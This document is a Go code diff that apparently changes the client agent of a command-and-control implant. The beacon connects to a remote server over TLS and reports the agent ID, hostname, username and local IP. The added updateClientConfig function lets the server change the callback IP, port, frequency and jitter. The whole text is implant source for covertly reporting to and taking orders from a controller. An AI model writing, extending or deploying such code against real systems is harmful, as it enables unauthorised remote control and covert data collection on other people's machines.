@@ -42,6 +42,7 @@ func main() {
 			time.Sleep(5 * time.Second)
 			continue
 		}
+		logger.Logf(logger.Info, "Beacon connected")
 
 		ip := getLocalIP(beacon)
 		err = sendConfigurationRequest(beacon, agentID, hostname, username, ip)
@@ -51,6 +52,8 @@ func main() {
 			time.Sleep(2 * time.Second)
 			continue
 		}
+
+		logger.Logf(logger.Info, "Beacon successful")
 
 		sleepInterval := calculateSleepInterval()
 		time.Sleep(time.Second * time.Duration(sleepInterval))
@@ -127,7 +130,46 @@ func sendConfigurationRequest(beacon *tls.Conn, agentID, hostname, username, ip 
     }
 
     encoder := gob.NewEncoder(beacon)
-    return encoder.Encode(request)
+    if err := encoder.Encode(request); err != nil {
+        return err
+    }
+
+    var response types.Response
+    decoder := gob.NewDecoder(beacon)
+    if err := decoder.Decode(&response); err != nil {
+        return err
+    }
+
+    if response.Type == types.ConfigurationResponseType {
+        configResponse, ok := response.Payload.(types.ConfigurationResponse)
+        if !ok {
+            return fmt.Errorf("unexpected payload type")
+        }
+
+        updateClientConfig(configResponse)
+    } else {
+        return fmt.Errorf("unexpected response type: %v", response.Type)
+    }
+    return nil
+}
+
+func updateClientConfig(config types.ConfigurationResponse) {
+    if config.ServerIP != ServerIP {
+		logger.Logf(logger.Info, "Updating callback IP")
+        ServerIP = config.ServerIP
+    }
+    if config.ServerPort != ServerPort {
+		logger.Logf(logger.Info, "Updating callback port")
+        ServerPort = config.ServerPort
+    }
+    if config.CallbackFrequency != CallbackFrequency {
+		logger.Logf(logger.Info, "Updating callback frequency")
+        CallbackFrequency = config.CallbackFrequency
+    }
+    if config.CallbackJitter != CallbackJitter {
+		logger.Logf(logger.Info, "Updating callback jitter")
+        CallbackJitter = config.CallbackJitter
+    }
 }
 
 func calculateSleepInterval() float64 {
